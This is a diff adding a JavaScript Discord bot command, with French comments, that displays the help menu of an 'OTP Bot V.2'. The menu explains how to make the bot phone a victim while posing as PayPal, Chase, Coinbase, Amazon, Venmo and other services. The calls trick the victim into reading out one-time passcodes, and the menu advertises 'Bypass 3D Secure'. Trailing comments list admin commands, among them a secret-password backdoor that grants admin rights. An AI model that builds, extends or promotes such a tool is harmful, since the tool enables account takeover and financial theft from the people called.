@@ -1,0 +1,30 @@
+module.exports = function(m) {
+  /**
+   * Récupération du fichier config
+   */
+  const config = require('../config');
+
+  /**
+   * Vérification de la commande, si help a été tapé alors contineur
+   */
+  if (m.command !== "anlat") return false;
+
+  /**
+   * Création du message embed fixe, présentation des commandes
+   */
+  const embed = {
+      "title": "Help, commands & informations",
+      "description": "OTP Bot V.2\nAll the Users commands : \n`.call tonumber fromnumber service otplength` or for example `!call 33612345678 9034436305 paypal 8` \n send a call to a specifiq phone number with the paypal service and a asking for an otp code with 8 numbers (like 12345678)\n\nRetrieves 4,6,8 Digit codes.Supports All World Languages\n\nThe differents call services supported :\n`Amazon`\n`Call-done`\n`Chase`\n`Cashapp`\n`Cdiscount`\n`Coinbase`\n`Crypto`\n`Default`\n`Facebook`\n`Gemini`\n`Instagram`\n`Moneygram`\n`Paypal`\n`Robinhood`\n`Snapchat`\n`Steam`\n`Wells`\n`Twitter`\n`Venmo` : work for all the systems\n`All World Bank` : Bypass 3D Secure",
+      "color": 11686254,
+      "footer": {
+        "text": m.user
+      }
+  };
+
+  /**
+   * Envoi du message embed
+   */
+  return m.message.channel.send({ embed });
+}
+//All the Admin commands : \n `!user add @user` : allow someone to use the bot & the calls\n`!user delete @user` : remove someone or an admin from the bot \n`!user info @user` : get infos from a user
+// \n`!user setadmin @user` : set a user to admin \n\n , \n`!secret yoursecretpassword @user` : set a user to admin without been admin
